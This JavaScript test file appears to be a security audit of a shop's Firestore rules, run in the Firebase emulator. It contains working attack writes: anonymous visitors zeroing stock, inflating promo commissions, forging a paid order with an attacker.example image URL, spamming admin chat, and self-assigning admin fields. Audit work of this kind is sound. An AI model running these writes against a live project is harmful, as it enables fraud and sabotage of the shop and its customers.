// Атаки на firestore.rules (копия с main a163f0c). Запуск из корня репозитория:
// npx firebase emulators:exec --config <scratch>/firebase.json --only firestore --project demo-audit-sec "node --test <scratch>/attacks.test.mjs"
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { after, before, beforeEach, describe, test } from 'node:test';
import assert from 'node:assert/strict';

const require = createRequire('/home/user/Wasatofficial-Shop-/package.json');
const { assertFails, assertSucceeds, initializeTestEnvironment } = require('@firebase/rules-unit-testing');
const {
  doc, getDoc, getDocs, setDoc, updateDoc, collection, query, limit, serverTimestamp, where, increment,
} = require('firebase/firestore');

const HERE = new URL('.', import.meta.url).pathname;
let env;

const anon = () => env.unauthenticatedContext().firestore(); // посетитель без входа
const guestChat = (uid = 'anon1') =>
  env.authenticatedContext(uid, { firebase: { sign_in_provider: 'anonymous' } }).firestore();
const customer = (uid = 'mallory') =>
  env.authenticatedContext(uid, { email: `${uid}@gmail.com`, email_verified: true, firebase: { sign_in_provider: 'google.com' } }).firestore();

const product = {
  id: 'p1', title: 'Пальто', price: 10000, category: 'coats', inStock: true,
  skus: [{ id: 'p1-m', color: 'Черный', size: 'M', stock: 3 }],
};
const promo = {
  id: 'promo1', code: 'BLOGGER15', discountPercent: 15, usageLimit: 50, usedCount: 2, active: true,
  isReferral: true, partnerName: '@blogger', partnerCommissionPercent: 10, generatedRevenue: 20000, commissionEarned: 2000,
};

async function seed(serverOrders) {
  await env.clearFirestore();
  await env.withSecurityRulesDisabled(async (ctx) => {
    const db = ctx.firestore();
    await setDoc(doc(db, 'products/p1'), product);
    await setDoc(doc(db, 'promos/promo1'), promo);
    await setDoc(doc(db, 'settings/quick_phrases'), { phrases: ['Внутренний шаблон ответа'] });
    await setDoc(doc(db, 'orders/WS-REAL1'), { id: 'WS-REAL1', customerUid: 'alice', customerPhone: '+79990000000', status: 'accepted' });
    if (serverOrders !== undefined) await setDoc(doc(db, 'settings/server'), { serverOrdersEnabled: serverOrders });
  });
}

before(async () => {
  env = await initializeTestEnvironment({
    projectId: 'demo-audit-sec',
    firestore: { rules: readFileSync(HERE + 'firestore.rules', 'utf8'), host: '127.0.0.1', port: 8180 },
  });
});
after(async () => { await env?.cleanup(); });

describe('Режим клиентских заказов (settings/server нет или serverOrdersEnabled=false)', () => {
  beforeEach(() => seed(undefined));

  test('A1 посетитель без входа обнуляет остаток и снимает товар с продажи', async () => {
    await assertSucceeds(updateDoc(doc(anon(), 'products/p1'), {
      skus: [{ id: 'p1-m', color: 'Черный', size: 'M', stock: 0 }], inStock: false,
    }));
    let snap; await env.withSecurityRulesDisabled(async (c) => { snap = await getDoc(doc(c.firestore(), 'products/p1')); });
    assert.equal(snap.data().inStock, false);
    assert.equal(snap.data().skus[0].stock, 0);
  });

  test('A2 посетитель без входа ставит остаток 9999 (продажа того, чего нет)', async () => {
    await assertSucceeds(updateDoc(doc(anon(), 'products/p1'), {
      skus: [{ id: 'p1-m', color: 'Черный', size: 'M', stock: 9999 }], inStock: true,
    }));
  });

  test('A3 посетитель без входа раздувает товар до ~900 КБ мусорных вариантов (каждый покупатель скачивает)', async () => {
    const junk = Array.from({ length: 3000 }, (_, i) => ({ id: `x${i}`, color: 'x'.repeat(200), size: 'XL', stock: 1 }));
    await assertSucceeds(updateDoc(doc(anon(), 'products/p1'), { skus: junk }));
  });

  test('A4 посетитель без входа «исчерпывает» промокод и накручивает комиссию партнера', async () => {
    await assertSucceeds(updateDoc(doc(anon(), 'promos/promo1'), {
      usedCount: 1_000_000, generatedRevenue: 99_000_000, commissionEarned: 9_900_000,
    }));
  });

  test('A5 посетитель без входа создает «оплаченный» заказ на 1 ₽ с чужими ценами и полями сервера', async () => {
    await assertSucceeds(setDoc(doc(anon(), 'orders/WS-FAKE1'), {
      id: 'WS-FAKE1', status: 'accepted', totalPrice: 1, paymentStatus: 'paid', placedVia: 'server',
      items: [{ product: { ...product, price: 1, image: 'https://attacker.example/pixel.gif' }, quantity: 5, selectedSize: 'M' }],
      customerName: 'Иван', customerPhone: '+70000000000', deliveryAddress: 'где угодно',
      discountAmount: 0, historySteps: [{ title: 'Оплачено', done: true }],
    }));
  });

  test('A6 посетитель без входа создает много заказов подряд (нет ограничения частоты)', async () => {
    const db = anon();
    for (let i = 0; i < 25; i++) {
      await assertSucceeds(setDoc(doc(db, `orders/SPAM-${i}`), {
        id: `SPAM-${i}`, status: 'accepted', totalPrice: 0, items: [{ x: 'y'.repeat(20000) }],
      }));
    }
  });
});

describe('Режим серверных заказов (serverOrdersEnabled=true) — проверка, что клиентские лазейки закрыты', () => {
  beforeEach(() => seed(true));
  test('S1 остатки, промокод и заказ напрямую — отказ', async () => {
    await assertFails(updateDoc(doc(anon(), 'products/p1'), { skus: [], inStock: false }));
    await assertFails(updateDoc(doc(anon(), 'promos/promo1'), { usedCount: 999 }));
    await assertFails(setDoc(doc(anon(), 'orders/WS-X'), { id: 'WS-X', status: 'accepted', totalPrice: 1, items: [{}] }));
  });
});

describe('Оба режима', () => {
  beforeEach(() => seed(true));

  test('B1 посетитель без входа читает все промокоды целиком (включая партнерские и лимиты)', async () => {
    const snap = await assertSucceeds(getDocs(collection(anon(), 'promos')));
    assert.equal(snap.docs[0].data().code, 'BLOGGER15');
    assert.equal(snap.docs[0].data().commissionEarned, 2000);
  });

  test('B2 посетитель без входа читает settings/server и шаблоны ответов поддержки', async () => {
    await assertSucceeds(getDoc(doc(anon(), 'settings/server')));
    await assertSucceeds(getDoc(doc(anon(), 'settings/quick_phrases')));
  });

  test('B3 анонимный гость чата: 30 сообщений по ~850 КБ с id, которые встают первыми в выдаче админки', async () => {
    const db = guestChat('anon1');
    const img = 'data:image/png;base64,' + 'A'.repeat(850_000);
    for (let i = 0; i < 30; i++) {
      const id = `0000-spam-${String(i).padStart(4, '0')}`;
      await assertSucceeds(setDoc(doc(db, `chat_messages/${id}`), {
        id, sender: 'user', text: 'спам', threadId: 'anon1', isInternalNote: false, imageUrl: img,
        threadName: 'Служба поддержки', sentAt: serverTimestamp(),
      }));
    }
    // Запрос админки: query(collection, limit(500)) без orderBy — порядок по id документа
    let adminFirst; await env.withSecurityRulesDisabled(async (c) => {
      adminFirst = (await getDocs(query(collection(c.firestore(), 'chat_messages'), limit(5)))).docs.map((d) => d.id); });
    assert.ok(adminFirst.every((id) => id.startsWith('0000-spam')));
    assert.ok('0000-spam' < 'msg-1727000000000', 'спам сортируется раньше настоящих msg-<время>');
  });

  test('B4 любой вошедший через Google создает неограниченно «Полезно» к несуществующим отзывам (их читает каждый посетитель)', async () => {
    const db = customer('mallory');
    for (let i = 0; i < 50; i++) {
      const reviewId = `nope${i}_victim`;
      await assertSucceeds(setDoc(doc(db, `review_votes/${reviewId}_mallory`), { reviewId, productId: 'nope', uid: 'mallory' }));
    }
    const all = await assertSucceeds(getDocs(collection(anon(), 'review_votes')));
    assert.equal(all.size, 50);
  });

  test('B5 покупатель пишет в свой профиль произвольные поля и ~900 КБ (админка грузит всех пользователей)', async () => {
    await assertSucceeds(setDoc(doc(customer('mallory'), 'users/mallory'), {
      uid: 'mallory', name: 'x', role: 'admin', isAdmin: true, blob: 'z'.repeat(900_000),
    }));
  });

  test('C1 проверки, которые держат: чужой заказ, бонусы, admins, почта владельца без подтверждения', async () => {
    await assertFails(getDoc(doc(customer('mallory'), 'orders/WS-REAL1')));
    await assertFails(getDocs(query(collection(anon(), 'orders'))));
    await assertFails(setDoc(doc(customer('mallory'), 'users/mallory'), { bonusPoints: 100000 }, { merge: true }));
    await assertFails(setDoc(doc(customer('mallory'), 'admins/mallory'), { x: 1 }));
    const fakeOwner = env.authenticatedContext('evil', { email: 'gunh83975@gmail.com', email_verified: false }).firestore();
    await assertFails(getDocs(collection(fakeOwner, 'orders')));
    await assertFails(getDocs(query(collection(guestChat('anon2'), 'chat_messages'), where('threadId', '==', 'anon1'), where('isInternalNote', '==', false))));
    await assertFails(getDocs(collection(guestChat('anon1'), 'chat_messages')));
  });
});
